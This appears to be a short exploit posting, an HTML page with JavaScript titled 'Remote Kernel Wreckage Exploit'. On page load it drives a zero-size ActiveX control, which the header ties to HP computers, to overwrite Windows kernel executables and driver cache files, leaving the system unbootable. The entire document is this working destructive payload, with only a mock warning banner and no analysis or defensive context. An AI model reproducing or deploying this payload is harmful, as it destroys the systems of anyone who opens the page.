////////////////////////////////

//Remote Kernel Wreckage Exploit

////////////////////////////////

//

//

// WARNING! THE REAL THING...

// DON'T TRY THIS AT HOME!

// THIS WILL DAMAGE YOUR

// HP COMPUTER SYSTEM!!!

//

//

////////////////////////////////

<html>

<head>

<script language="JavaScript">

function spawn3()

{

o2obj.EvaluateRules();

o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntoskrnl.exe");

o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntkrnlpa.exe");

o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntkrnlmp.exe");

o2obj.SaveToFile("c:\\WINDOWS\\system32\\dllcache\\ntkrpamp.exe");

o2obj.SaveToFile("c:\\WINDOWS\\system32\\ntoskrnl.exe");

o2obj.SaveToFile("c:\\WINDOWS\\system32\\ntkrnlpa.exe");

o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntoskrnl.exe");

o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlpa.exe");

o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntkrnlmp.exe");

o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\ntkrpamp.exe");

o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\sp2.cab");

o2obj.SaveToFile("c:\\WINDOWS\\Driver Cache\\i386\\driver.cab");

}

function meltdown()

{

spawn3();

spawn3();

spawn3();

}

</script>

</head>

<body onload="meltdown()">

<object ID="o2obj" WIDTH=0 HEIGHT=0

classid="clsid:7CB9D4F5-C492-42A4-93B1-3F7D6946470D"

</object>

</body>

</html>